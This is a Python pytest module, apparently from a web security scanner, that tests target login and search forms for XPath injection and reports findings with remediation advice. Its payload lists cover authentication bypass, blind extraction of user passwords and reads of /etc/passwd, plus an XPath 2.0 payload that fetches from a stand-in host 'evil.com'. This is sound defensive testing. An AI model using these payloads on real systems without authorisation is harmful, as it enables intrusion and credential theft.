"""
XPath Injection Tests

Tests for XPath injection attacks including:
- Authentication bypass
- XML traversal
- Blind XPath injection
- Logical operators
"""

import pytest

from utils.scanner import SecurityScanner, Finding, Severity, extract_forms

# XPath injection payloads
XPATH_OR_PAYLOADS = [
    "' or '1'='1",
    "' or ''='",
    "' or 1=1",
    "' or 'admin'='admin'",
    "' or 'a'='a'",
    "admin' or '1'='1",
    "' or true() or '",
    "' or not(false()) or '",
]

XPATH_STRING_PAYLOADS = [
    "' or string-length('x')>0",
    "' or string-length('x')>=1",
    "' or string-length('')>=0",
    "' or string-length(.)>0",
    "' or contains(.,'a')",
    "' or starts-with(.,'a')",
]

XPATH_COMMENT_PAYLOADS = [
    "admin'--",
    "admin' or '1'='1'--",
    "admin' or ''='",
    "' or ''='",
    "']/*[1]/*[1]",
    "admin']//*",
]

XPATH_WILDCARD_PAYLOADS = [
    "'*[1]='1'",
    "'*'",
    "'*[0]='0'",
    "//*",
    "//user/*",
]

XPATH_TRAVERSAL_PAYLOADS = [
    "' or /descendant::*='",
    "' or /child::*='",
    "' or /*/*='",
    "/../../../etc/passwd",
    "/ancestor::*",
]

XPATH_2_PAYLOADS = [
    "' or doc('http://evil.com/xxe.xml')",
    "' or unparsed-text('file:///etc/passwd')",
    "' or matches(.,'.*')",
    "' or tokenize(.,' ')",
]

XPATH_BOOLEAN_BLIND = [
    "' and '1'='1",
    "' and '1'='2",
    "' and substring(//user/password,1,1)='a",
    "' and string-length(//user/password)>5",
]


@pytest.fixture
def xpath_scanner(test_config):
    """Create scanner for XPath tests."""
    return SecurityScanner(test_config)


class TestXPathInjection:
    """XPath injection test suite."""

    def _check_xpath_injection(self, response_text, payload, test_url):
        """Check if XPath injection was successful."""
        xpath_success = ["welcome", "dashboard", "admin", "authenticated", "success", "logged in", "1=1"]

        for indicator in xpath_success:
            if indicator in response_text.lower():
                finding = Finding(
                    title="XPath Injection Successful",
                    severity=Severity.HIGH,
                    description=f"XPath injection successful - {payload}",
                    url=test_url,
                    evidence=f"Success indicator found: {indicator}",
                    remediation="Sanitize XPath queries. Use parameterized queries. Avoid concatenating user input.",
                    cwe_id="CWE-643",
                    owasp_category="A01:2021 - Broken Access Control",
                )
                return finding
        return None

    def _find_login_forms(self, forms):
        """Find forms that look like login forms."""
        login_forms = []
        for form in forms[:5]:
            has_user = False
            has_pass = False
            for inp in form.get("inputs", []):
                name = inp.get("name", "").lower()
                if "username" in name or "user" in name or "email" in name:
                    has_user = True
                if "password" in name or "pass" in name:
                    has_pass = True
            if has_user or has_pass:
                login_forms.append(form)
        return login_forms[:3]

    def _find_search_forms(self, forms):
        """Find forms that look like search forms."""
        search_forms = []
        for form in forms[:5]:
            for inp in form.get("inputs", []):
                name = inp.get("name", "").lower()
                if "search" in name or "query" in name or "id" in name or "q" in name:
                    search_forms.append(form)
                    break
        return search_forms[:3]

    @pytest.mark.security
    @pytest.mark.xpath_injection
    def test_xpath_or_bypass(self, xpath_scanner, target_url, findings_collector):
        """Test for XPath OR authentication bypass."""
        resp = xpath_scanner.get(target_url)

        if not resp or resp.status_code != 200:
            pytest.skip("Could not access target")

        forms = extract_forms(resp.text, target_url)
        login_forms = self._find_login_forms(forms)

        for form in login_forms:
            user_field = None
            pass_field = None

            for inp in form["inputs"]:
                name = inp["name"].lower()
                if "username" in name or "user" in name:
                    user_field = inp["name"]
                elif "password" in name:
                    pass_field = inp["name"]

            if user_field:
                for payload in XPATH_OR_PAYLOADS:
                    form_data = {user_field: payload}
                    if pass_field:
                        form_data[pass_field] = "test123"

                    resp = xpath_scanner.post(form["action"], data=form_data)

                    if resp:
                        finding = self._check_xpath_injection(resp.text, payload, form["action"])
                        if finding:
                            findings_collector.add(finding)
                            xpath_scanner.add_finding(finding)
                            return

    @pytest.mark.security
    @pytest.mark.xpath_injection
    def test_xpath_string_length(self, xpath_scanner, target_url, findings_collector):
        """Test for XPath string-length based attacks."""
        resp = xpath_scanner.get(target_url)

        if not resp or resp.status_code != 200:
            pytest.skip("Could not access target")

        forms = extract_forms(resp.text, target_url)
        search_forms = self._find_search_forms(forms)

        for form in search_forms:
            for inp in form["inputs"]:
                name = inp["name"].lower()
                if "search" in name or "query" in name or "id" in name:
                    for payload in XPATH_STRING_PAYLOADS:
                        form_data = {inp["name"]: payload}

                        resp = xpath_scanner.post(form["action"], data=form_data)

                        if resp:
                            finding = self._check_xpath_injection(resp.text, payload, form["action"])
                            if finding:
                                findings_collector.add(finding)
                                xpath_scanner.add_finding(finding)
                                return

    @pytest.mark.security
    @pytest.mark.xpath_injection
    def test_xpath_comment_bypass(self, xpath_scanner, target_url, findings_collector):
        """Test for XPath comment-based bypass."""
        resp = xpath_scanner.get(target_url)

        if not resp or resp.status_code != 200:
            pytest.skip("Could not access target")

        forms = extract_forms(resp.text, target_url)
        login_forms = self._find_login_forms(forms)

        for form in login_forms:
            user_field = None
            pass_field = None

            for inp in form["inputs"]:
                name = inp["name"].lower()
                if "username" in name or "user" in name:
                    user_field = inp["name"]
                elif "password" in name:
                    pass_field = inp["name"]

            if user_field:
                for payload in XPATH_COMMENT_PAYLOADS:
                    form_data = {user_field: payload}
                    if pass_field:
                        form_data[pass_field] = "test123"

                    resp = xpath_scanner.post(form["action"], data=form_data)

                    if resp:
                        finding = self._check_xpath_injection(resp.text, payload, form["action"])
                        if finding:
                            findings_collector.add(finding)
                            xpath_scanner.add_finding(finding)
                            return

    @pytest.mark.security
    @pytest.mark.xpath_injection
    def test_xpath_wildcard(self, xpath_scanner, target_url, findings_collector):
        """Test for XPath wildcard injection."""
        resp = xpath_scanner.get(target_url)

        if not resp or resp.status_code != 200:
            pytest.skip("Could not access target")

        forms = extract_forms(resp.text, target_url)
        search_forms = self._find_search_forms(forms)

        for form in search_forms:
            for inp in form["inputs"]:
                name = inp["name"].lower()
                if "search" in name or "query" in name or "id" in name:
                    for payload in XPATH_WILDCARD_PAYLOADS:
                        form_data = {inp["name"]: payload}

                        resp = xpath_scanner.post(form["action"], data=form_data)

                        if resp:
                            finding = self._check_xpath_injection(resp.text, payload, form["action"])
                            if finding:
                                findings_collector.add(finding)
                                xpath_scanner.add_finding(finding)
                                return

    @pytest.mark.security
    @pytest.mark.xpath_injection
    def test_xpath_traversal(self, xpath_scanner, target_url, findings_collector):
        """Test for XPath node traversal."""
        resp = xpath_scanner.get(target_url)

        if not resp or resp.status_code != 200:
            pytest.skip("Could not access target")

        forms = extract_forms(resp.text, target_url)
        search_forms = self._find_search_forms(forms)

        for form in search_forms:
            for inp in form["inputs"]:
                name = inp["name"].lower()
                if "search" in name or "query" in name or "id" in name:
                    for payload in XPATH_TRAVERSAL_PAYLOADS:
                        form_data = {inp["name"]: payload}

                        resp = xpath_scanner.post(form["action"], data=form_data)

                        if resp:
                            finding = self._check_xpath_injection(resp.text, payload, form["action"])
                            if finding:
                                findings_collector.add(finding)
                                xpath_scanner.add_finding(finding)
                                return

    @pytest.mark.security
    @pytest.mark.xpath_injection
    def test_xpath_2_functions(self, xpath_scanner, target_url, findings_collector):
        """Test for XPath 2.0 function injection."""
        resp = xpath_scanner.get(target_url)

        if not resp or resp.status_code != 200:
            pytest.skip("Could not access target")

        forms = extract_forms(resp.text, target_url)
        search_forms = self._find_search_forms(forms)

        for form in search_forms:
            for inp in form["inputs"]:
                name = inp["name"].lower()
                if "search" in name or "query" in name or "id" in name:
                    for payload in XPATH_2_PAYLOADS:
                        form_data = {inp["name"]: payload}

                        resp = xpath_scanner.post(form["action"], data=form_data)

                        if resp:
                            text = resp.text.lower()
                            # Check for XPath 2.0 specific indicators
                            if "evil.com" in text or "root:" in text or "passwd" in text:
                                finding = Finding(
                                    title="XPath 2.0 Function Injection",
                                    severity=Severity.HIGH,
                                    description=f"XPath 2.0 function injection - {payload}",
                                    url=form["action"],
                                    evidence=f"XPath 2.0 payload executed: {payload}",
                                    remediation="Disable XPath 2.0 functions. Use parameterized queries. Block doc() and unparsed-text().",
                                    cwe_id="CWE-643",
                                    owasp_category="A03:2021 - Injection",
                                )
                                findings_collector.add(finding)
                                xpath_scanner.add_finding(finding)
                                return

    @pytest.mark.security
    @pytest.mark.xpath_injection
    def test_xpath_boolean_blind(self, xpath_scanner, target_url, findings_collector):
        """Test for blind XPath injection using boolean-based detection."""
        resp = xpath_scanner.get(target_url)

        if not resp or resp.status_code != 200:
            pytest.skip("Could not access target")

        forms = extract_forms(resp.text, target_url)
        login_forms = self._find_login_forms(forms)

        for form in login_forms:
            user_field = None
            pass_field = None

            for inp in form["inputs"]:
                name = inp["name"].lower()
                if "username" in name or "user" in name:
                    user_field = inp["name"]
                elif "password" in name:
                    pass_field = inp["name"]

            if user_field:
                # Test true condition
                true_payload = "' and '1'='1"
                false_payload = "' and '1'='2"

                true_data = {user_field: f"admin{true_payload}"}
                false_data = {user_field: f"admin{false_payload}"}
                if pass_field:
                    true_data[pass_field] = "test"
                    false_data[pass_field] = "test"

                true_resp = xpath_scanner.post(form["action"], data=true_data)
                false_resp = xpath_scanner.post(form["action"], data=false_data)

                if true_resp and false_resp:
                    # Different responses indicate blind XPath injection
                    if len(true_resp.text) != len(false_resp.text):
                        finding = Finding(
                            title="Blind XPath Injection Detected",
                            severity=Severity.HIGH,
                            description="Boolean-based blind XPath injection - different responses for true/false conditions",
                            url=form["action"],
                            evidence=f"True response length: {len(true_resp.text)}, False: {len(false_resp.text)}",
                            remediation="Use parameterized XPath queries. Sanitize all user input.",
                            cwe_id="CWE-643",
                            owasp_category="A03:2021 - Injection",
                        )
                        findings_collector.add(finding)
                        xpath_scanner.add_finding(finding)
                        return

    @pytest.mark.security
    @pytest.mark.xpath_injection
    def test_xpath_error_based(self, xpath_scanner, target_url, findings_collector):
        """Test for error-based XPath injection."""
        resp = xpath_scanner.get(target_url)

        if not resp or resp.status_code != 200:
            pytest.skip("Could not access target")

        forms = extract_forms(resp.text, target_url)
        search_forms = self._find_search_forms(forms)

        error_payloads = [
            "' div 0",  # Division by zero
            "' and string(1 div 0)",
            "']]>",  # XML breaking
            "<!--",  # Comment injection
            "' and error()",
        ]

        for form in search_forms:
            for inp in form["inputs"]:
                name = inp["name"].lower()
                if "search" in name or "query" in name or "id" in name:
                    for payload in error_payloads:
                        form_data = {inp["name"]: payload}

                        resp = xpath_scanner.post(form["action"], data=form_data)

                        if resp:
                            text = resp.text.lower()
                            error_indicators = ["xpath", "xml", "expression", "syntax error", "invalid", "parser"]

                            for indicator in error_indicators:
                                if indicator in text:
                                    finding = Finding(
                                        title="Error-Based XPath Injection",
                                        severity=Severity.MEDIUM,
                                        description=f"XPath error disclosed - {payload}",
                                        url=form["action"],
                                        evidence=f"Error indicator: {indicator}",
                                        remediation="Hide XPath error messages. Use custom error handlers.",
                                        cwe_id="CWE-643",
                                        owasp_category="A03:2021 - Injection",
                                    )
                                    findings_collector.add(finding)
                                    xpath_scanner.add_finding(finding)
                                    return
